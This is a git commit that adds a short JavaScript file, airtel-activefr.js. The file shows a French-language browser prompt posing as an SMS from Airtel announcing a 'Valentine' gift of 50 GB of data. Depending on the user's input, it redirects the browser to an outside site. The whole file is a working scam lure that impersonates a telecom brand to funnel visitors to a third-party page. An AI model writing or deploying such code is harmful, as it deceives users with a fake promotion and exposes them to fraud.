50ff16454bb0be1b427ea71102a6bf164bfc78f5
superblog1 <imohette4@gmail.com>
2025-02-02 06:42:51 +0100

    Create airtel-activefr.js

---
+++ airtel-activefr.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, vous êtes admissible au cadeau Airtel Valentine, veuillez appuyer sur OK pour activer maintenant   ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://fast-wayprogram.org/airtel-val-fr.html';
+}
